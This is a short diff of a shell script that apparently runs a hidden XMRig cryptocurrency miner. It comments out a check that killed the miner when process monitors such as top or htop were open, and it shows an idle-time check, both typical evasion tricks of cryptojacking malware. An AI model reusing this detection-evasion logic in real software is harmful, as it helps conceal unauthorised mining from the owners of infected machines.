@@ -35,11 +35,11 @@ main() {
 
 	while true; do 
 		sleep 1
-		if pgrep -x "top" || pgrep -x "htop" || pgrep -x "atop" || pgrep -x "mate-system-mon"; then
-			echo "Found top, killing xrig"
-			killall -q $XMRIGNAME
-			continue
-		fi
+		# if pgrep -x "top" || pgrep -x "htop" || pgrep -x "atop" || pgrep -x "mate-system-mon"; then
+		# 	echo "Found top, killing xrig"
+		# 	killall -q $XMRIGNAME
+		# 	continue
+		# fi
 
 		if [[ isUI -eq 1 ]]; then
 			idle=$($LOCAL_PATH/$XPRINTIDLE_NAME)
